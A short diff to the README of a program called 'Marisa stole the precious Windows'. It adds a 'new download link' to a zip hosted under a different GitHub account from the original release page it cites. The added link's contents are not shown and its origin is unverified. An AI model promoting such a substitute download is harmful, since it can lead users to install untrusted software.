@@ -1,5 +1,6 @@
 no video as the original had an issue with the video.
 ---
+[new download link 🙀](https://github.com/Ikram232/marisa-stole-the-precious-windows-novid/releases/download/tag/marisa-novid.zip)
 
 # Marisa stole the precious Windows
 [Release page](https://github.com/ad2017gd/marisa-stole-the-precious-windows/releases/tag/V1.0)
